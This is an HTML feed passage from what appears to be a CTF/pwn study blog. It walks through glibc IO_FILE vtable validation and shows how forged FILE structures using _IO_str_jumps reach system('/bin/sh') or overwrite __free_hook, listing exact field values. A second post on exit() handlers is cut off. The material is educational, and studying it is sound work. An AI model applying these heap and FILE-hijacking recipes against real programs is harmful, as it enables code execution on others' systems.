function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算 <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>，紧接着会判断 vtable - <strong>start_</strong>libc_IO_vtables 的 offset ，如果这个 offset 大于 section_length , 即大于 <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> 那么就会调用 <code>_IO_vtable_check()</code> 这个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="type">void</span> (*flag) (<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (_dl_open_hook != <span class="literal">NULL</span></span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 vtable 是非法的，那么会引发 abort。</p><p><u>在加入这个限制后,对vtable的利用几乎难以实现</u></p><p><u>故将视线转向IO_FILE本身</u></p><p>当然这些利用在之前的版本亦有效</p><h3 id="fileno-与缓冲区的相关利用"><a href="#fileno-与缓冲区的相关利用" class="headerlink" title="fileno 与缓冲区的相关利用"></a>fileno 与缓冲区的相关利用</h3><p>_IO_FILE 在使用标准 IO 库时会进行创建并负责维护一些相关信息，其中有一些域是表示调用诸如 fwrite、fread 等函数时写入地址或读取地址的，如果可以控制这些数据就可以实现任意地址写或任意地址读。</p><p>因为三个标准流的存在</p><p>无需文件操作,直接利用scanf\printf便可以进行利用。</p><p>其中_IO_buf_base 表示操作的起始地址，_IO_buf_end 表示结束地址，通过控制这两个数据可以实现控制读写的操作。</p><h3 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h3><p>libc.so中还存在其他的无检查的vtable如_IO_str_jumps和_IO_wstr_jumps,其中前者的绕过更为简单</p><p>以前者为例,源码位于bits/strops.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果我们能设置文件指针的 <code>vtable</code> 为 <code>_IO_str_jumps</code> 么就能调用不一样的文件操作函数。</p><p><strong>出现的结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> *(*_IO_alloc_type) (_IO_size_t);</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*_IO_free_type)</span> <span class="params">(<span class="type">void</span>*)</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is needed for the Irix6 N32 ABI, which has a 64 bit off_t type,</span></span><br><span class="line"><span class="comment">   but a 32 bit pointer type.  In this case, we get 4 bytes of padding</span></span><br><span class="line"><span class="comment">   after the vtable pointer.  Putting them in a structure together solves</span></span><br><span class="line"><span class="comment">   this problem.  */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure><h4 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)<span class="comment">// pass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only))<span class="comment">// should in </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// pass</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">char</span> *new_buf;</span><br><span class="line">      <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">      _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">      <span class="keyword">if</span> (new_size &lt; old_blen)<span class="comment">//pass 由上一句能看出一般会通过</span></span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">      new_buf</span><br><span class="line">        = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);<span class="comment">//call qword ptr [fp+0xe0] 参数是new_size</span></span><br><span class="line">      <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">          <span class="keyword">return</span> EOF;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (old_buf)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">          (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">          <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">          fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">      _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">      fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">      fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">      fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">      fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_blen(fp)宏</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><h5 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h5><p>利用的是其中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="type">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>要满足的条件</p><ol><li>fp-&gt;_flags &amp; _IO_NO_WRITES为假</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)为假</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 不能为负数</li><li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; 应当指向/bin/sh字符串对应的地址</li><li>fp+0xe0指向system地址</li></ol><p>绕过</p><ol><li>fp-&gt;<em>flags = 0</em></li><li>_fp-&gt;_IO_buf_base = 0</li><li>fp-&gt;<em>IO_buf_end = (bin_sh_addr - 100) / 2</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li><li>vtable = _IO_str_jumps - 0x18</li></ol><p>或者</p><ol><li>_flags = 0 </li><li>_IO_write_base = 0 </li><li>_IO_write_ptr = (binsh_in_libc_addr -100) / 2 +1 </li><li>_IO_buf_end = (binsh_in_libc_addr -100) / 2  </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_jumps - 0x18</li></ol><h5 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h5><p>注意到满足</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))</span><br></pre></td></tr></table></figure><p>的时候，会先后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size_t old_blen = _IO_blen (fp);</span><br><span class="line">// #define _IO_blen (fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span><br><span class="line">new_buf = malloc (new_size);</span><br><span class="line">memcpy (new_buf, old_buf, old_blen);</span><br><span class="line">free (old_buf);</span><br></pre></td></tr></table></figure><p>三个操作，伪造 _IO_FILE 并劫持 vtable 为 _IO_str_jumps 通过一个 large bin attack 就可以轻松实现，并且上面三个语句中的 new_size，old_buf 和 old_blen 是我们可控的，这个函数就可以实现以下三步</p><ol><li>调用 malloc，实现从 tcache 中分配 chunk，在这里就可以把我们之前放入的 __free_hook fake chunk 申请出来</li><li>将一段可控长度可控内容的内存段拷贝置 malloc 得来的 chunk 中（可以修改 __free_hook 为 system）</li><li>调用 free，且参数为内存段起始地址（”/bin/sh\x00”，getshell）</li></ol><p>只要构造得当，执行该函数即可 getshell。</p><h4 id="finish"><a href="#finish" class="headerlink" title="finish"></a>finish</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//call qword ptr [fp+0E8h]参数为fp-&gt;_IO_buf_base</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>条件：</p><ol><li>_IO_buf_base 不为空</li><li>_flags &amp; _IO_USER_BUF(0x01) 为假</li></ol><p>构造如下：</p><ol><li>_flags = (binsh_in_libc + 0x10) &amp; ~1 </li><li>_IO_buf_base = binsh_addr </li><li>_freeres_list = 0x2 </li><li>_freeres_buf = 0x3 </li><li>_mode = -1 </li><li>vtable = _IO_str_finish - 0x18 </li><li>fp+0xe8 -&gt; system_addr</li></ol><p>或者</p><ol><li>fp-&gt;<em>flags = 0</em></li><li><em>vtable = _IO_str_jumps - 0x8//这样调用_IO_overflow时会调用到 _IO_str_finish</em></li><li>_fp-&gt;_IO_buf_base = /bin/sh_addr</li><li>fp+0xe8 = system_addr</li></ol>]]></content>
    
    
    <summary type="html">IO_FILE初识</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="IO_FILE" scheme="https://ixout.github.io/tags/IO-FILE/"/>
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>exit函数利用</title>
    <link href="https://ixout.github.io/posts/11890/"/>
    <id>https://ixout.github.io/posts/11890/</id>
    <published>2023-04-05T03:00:01.000Z</published>
    <updated>2023-04-08T03:26:43.746Z</updated>
    
    <content type="html"><![CDATA[<h1 id="源码2-27"><a href="#源码2-27" class="headerlink" title="源码2.27"></a>源码2.27</h1><p>先看两个exit.h中的重要结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="comment">/*函数类型, 可以是&#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;</span></span><br><span class="line"><span class="comment">       - ef_free表示此位置空闲</span></span><br><span class="line"><span class="comment">       - ef_us表示此位置被使用中, 但是函数类型不知道</span></span><br><span class="line"><span class="comment">       - ef_on, ef_at, ef_cxa 分别对应三种不同的析构函数类型, 主要是参数上的差异*/</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>         //一个联合体<span class="title">func</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line"><span class="type">void</span> (*at) (<span class="type">void</span>);   <span class="comment">//ef_at类型 没有参数</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);   <span class="comment">//ef_on类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">  &#125; on;</span><br><span class="line"><span class="class"><span class="keyword">struct</span>    </span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status); <span class="comment">//ef_cxa类型</span></span><br><span class="line">    <span class="type">void</span> *arg;</span><br><span class="line">    <span class="type">void</span> *dso_handle;</span><br><span class="line">  &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span>  <span class="comment">//下一个exit_function_list,单链表</span></span><br><span class="line">    <span class="type">size_t</span> idx;   <span class="comment">//记录有多少个函数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span>  <span class="comment">//exit_function数组,析构函数数组</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure></p><p>首先是exit的源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>libc经典的套娃函数,可以看出exit的主体是__run_exit_handlers</p><p>run_exit_handlers()的主要工作就是<strong>调用exit_funcs中保存的各种函数指针</strong></p><p>看其工作流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//调用atexit与on_exit注册的函数，顺序为注册的逆序</span></span><br><span class="line"><span class="type">void</span> attribute_hidden __run_exit_handlers(<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//首先释放线程局部储存, 即TLS</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line"><span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__call_tls_dtors();</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历exit_fundtion_list链表，链表种每个节点里又有一个函数指针数组，根据里面的函数类型进行调用</span></span><br><span class="line"><span class="keyword">while</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp; <span class="comment">//cur指向当前exit_function_list节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//cur-&gt;idx表示cur-&gt;fns中有多少个函数，从后往前遍历</span></span><br><span class="line"><span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>) <span class="comment">//遍历exit_function_list节点中 析构函数数组fns[32]中的函数指针</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span 